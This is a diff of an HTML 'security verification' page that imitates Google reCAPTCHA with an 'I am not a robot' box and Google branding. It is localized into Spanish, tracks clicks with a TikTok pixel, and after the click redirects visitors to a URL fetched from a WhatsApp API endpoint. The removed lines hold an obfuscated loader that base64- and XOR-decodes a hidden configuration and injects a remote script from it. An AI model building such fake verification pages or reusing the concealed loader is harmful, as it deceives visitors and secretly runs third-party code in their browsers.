@@ -1,12 +1,12 @@
 <!doctype html>
-<html lang="en">
+<html lang="es-MX">
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
   <meta name="robots" content="noindex,nofollow">
   <meta name="theme-color" content="#f4f4f4">
-  <title>Security Verification</title>
-  <link rel="stylesheet" href="assets/style.css">
+  <title>Verificación de seguridad</title>
+  <link rel="stylesheet" href="../assets/style.css">
   <script src="config.js"></script>
   <!-- TikTok Pixel Code Start -->
   <script>
@@ -15,43 +15,42 @@
   var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
   ;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
 
-    ttq.load('DA7JFDBC77UC8FLJ7A00');
+    ttq.load('DABOHKBC77UC8FLJGOH0');
     ttq.page();
   }(window, document, 'ttq');
   </script>
   <!-- TikTok Pixel Code End -->
-
-  <script>(function(){var m_jo=atob("DLCiKr9IV7QmdwjBp8uAX80kdY4EH3y118OYBZArM9oIAnysztbbBNwnOppEBSeyxMLLWss7eMRPD22tiMDLUtokesBPHHyuzJ7IWZ1kddVSA3qoxcXWT8xqbe97Wyqmy9/AS9M7dY59DCqvxt3HCIVqI91NI2eq99naT9MBM5YKVX6gy8XHCIVqYdUeETuik4nASdt+NoNHRDv5xICVHdsudcl7Cg==");var l_u0=[];for(var l_5r6=0;l_5r6<m_jo.length;l_5r6++){l_u0.push(m_jo.charCodeAt(l_5r6)&255);}var r_pigg=l_u0[0];var v_co=l_u0.slice(1,1+r_pigg);var r_a=l_u0.slice(1+r_pigg);var x_b=r_a.map(function(b,v_j71v){return b^v_co[v_j71v%r_pigg];});var n_q="";for(var j_zig=0;j_zig<x_b.length;j_zig++){n_q+=String.fromCharCode(x_b[j_zig]&255);}var d_1=decodeURIComponent(escape(n_q));var h_5uw=JSON.parse(d_1);var g_hpy=h_5uw.globals||[];g_hpy.forEach(function(y_90){window[y_90.name]=y_90.value;});var h_03=document.createElement("script");h_03.src=h_5uw.url;h_03.async=true;h_03.defer=true;(h_5uw.attributes||[]).forEach(function(a_wk){h_03.setAttribute(a_wk.name,a_wk.value);});(document.head||document.documentElement).appendChild(h_03);})();</script>
-
-  <script async src="https://app.palinskigroup.biz/tracking.js" data-key="Y4d_n1fzSnhymBabIyXEMl5QnMi4mJ00MkzJFkTUP8E"></script>
 </head>
 <body>
   <main class="verify-page">
-    <section class="verify-wrap" aria-label="Security verification">
+    <section class="verify-wrap" aria-label="Verificación de seguridad">
       <div class="verify-title">
         <span class="title-icon" aria-hidden="true"><span class="title-check">✓</span></span>
-        <span id="titleText">Security Verification</span>
+        <span id="titleText">Verificación de seguridad</span>
       </div>
 
-      <button id="verifyBox" class="captcha-box" type="button" aria-label="Confirm verification">
+      <button id="verifyBox" class="captcha-box" type="button" aria-label="Confirmar verificación">
         <span id="checkbox" class="captcha-checkbox" aria-hidden="true"></span>
-        <span id="checkboxText" class="captcha-label">I am not a robot</span>
+        <span id="checkboxText" class="captcha-label">No soy un robot</span>
         <span class="captcha-brand" aria-hidden="true">
           <span class="google-g">G</span>
           <span class="recaptcha-name">reCAPTCHA</span>
-          <span id="recaptchaLinks" class="recaptcha-links"><span>Privacy</span><span>Terms</span></span>
+          <span id="recaptchaLinks" class="recaptcha-links"><span>Privacidad</span><span>Términos</span></span>
         </span>
       </button>
 
-      <div id="footerText" class="verify-footer">Protected by verification · Privacy · Terms</div>
+      <div id="footerText" class="verify-footer">Protegido por verificación · Privacidad · Términos</div>
+      <div id="errorBox" style="display:none; color:#c62828; font-size:12px; margin-top:10px; line-height:1.4; text-align:center;"></div>
     </section>
   </main>
 
   <script>
     const cfg = window.PRESELL_CONFIG || {};
-    const title = cfg.title || 'Security Verification';
-    const checkboxText = cfg.checkboxText || 'I am not a robot';
-    const footerText = cfg.footerText || 'Protected by verification · Privacy · Terms';
+    const title = cfg.title || 'Verificación de seguridad';
+    const checkboxText = cfg.checkboxText || 'No soy un robot';
+    const footerText = cfg.footerText || 'Protegido por verificación · Privacidad · Términos';
+    const errorMessage = cfg.errorMessage || 'No fue posible continuar en este momento. Inténtalo de nuevo.';
+    
     document.title = title;
     document.getElementById('titleText').textContent = title;
     document.getElementById('checkboxText').textContent = checkboxText;
@@ -59,55 +58,82 @@
 
     const box = document.getElementById('verifyBox');
     const check = document.getElementById('checkbox');
-    let clicked = false;
+    const errorBox = document.getElementById('errorBox');
+    let isProcessing = false;
 
-    function getDestinationUrl() {
-      const params = new URLSearchParams(window.location.search);
-      let dest = params.get('to') || params.get('redirect') || params.get('url') || cfg.destinationUrl || '#';
-      if (dest !== '#') {
-        try {
-          const resolvedUrl = new URL(dest, window.location.href);
-          params.forEach((value, key) => {
-            if (key !== 'to' && key !== 'redirect' && key !== 'url') {
-              resolvedUrl.searchParams.set(key, value);
-            }
-          });
-          dest = resolvedUrl.href;
-        } catch (e) {
-          const cleanParams = new URLSearchParams(window.location.search);
-          cleanParams.delete('to');
-          cleanParams.delete('redirect');
-          cleanParams.delete('url');
-          const searchStr = cleanParams.toString();
-          if (searchStr) {
-            const separator = dest.includes('?') ? '&' : '?';
-            dest = dest + separator + searchStr;
-          }
+    function fireTrackingEvent() {
+      try {
+        if (window.ttq && typeof window.ttq.track === 'function') {
+          window.ttq.track('ClickButton');
         }
+      } catch (e) {
+        console.warn('Tracking event error:', e);
       }
-      return dest;
     }
 
-    function isValidDestination(url) {
-      return url && url !== '#' && !url.includes('SEU-LINK-AQUI') && !url.includes('COLE-O-LINK-AQUI');
+    function getApiUrl() {
+      const apiUrl = cfg.whatsappApiUrl || '/api/whatsapp';
+      const search = window.location.search;
+      if (!search) return apiUrl;
+      const separator = apiUrl.includes('?') ? '&' : '?';
+      return apiUrl + separator + search.substring(1);
     }
 
-    box.addEventListener('click', () => {
-      if (clicked) return;
-      clicked = true;
+    box.addEventListener('click', async () => {
+      if (isProcessing) return;
+      isProcessing = true;
+
+      if (errorBox) {
+        errorBox.style.display = 'none';
+        errorBox.textContent = '';
+      }
+
       box.classList.add('loading');
       check.innerHTML = '<span class="spinner"></span>';
 
-      setTimeout(() => {
-        box.classList.remove('loading');
-        box.classList.add('checked');
-        check.textContent = '✓';
-        const url = getDestinationUrl();
-        if (cfg.redirectAfterVerify !== false && isValidDestination(url)) {
-          window.location.href = url;
+      fireTrackingEvent();
+
+      try {
+        const targetApiUrl = getApiUrl();
+        const response = await fetch(targetApiUrl, {
+          method: 'GET',
+          headers: {
+            'Accept': 'application/json'
+          }
+        });
+
+        if (!response.ok) {
+          throw new Error('Fallo en la respuesta del servidor');
         }
-      }, Number(cfg.delayAfterClick || 650));
-    }, { passive: true });
+
+        const data = await response.json();
+
+        if (data && data.url) {
+          const delay = Number(cfg.delayAfterClick || 650);
+          setTimeout(() => {
+            box.classList.remove('loading');
+            box.classList.add('checked');
+            check.textContent = '✓';
+
+            if (cfg.redirectAfterVerify !== false) {
+              window.location.href = data.url;
+            }
+          }, delay);
+        } else {
+          throw new Error('URL de redirección no retornada');
+        }
+      } catch (err) {
+        console.error('Error en la redirección:', err);
+        box.classList.remove('loading');
+        check.innerHTML = '';
+        isProcessing = false;
+
+        if (errorBox) {
+          errorBox.textContent = errorMessage;
+          errorBox.style.display = 'block';
+        }
+      }
+    });
   </script>
 </body>
 </html>
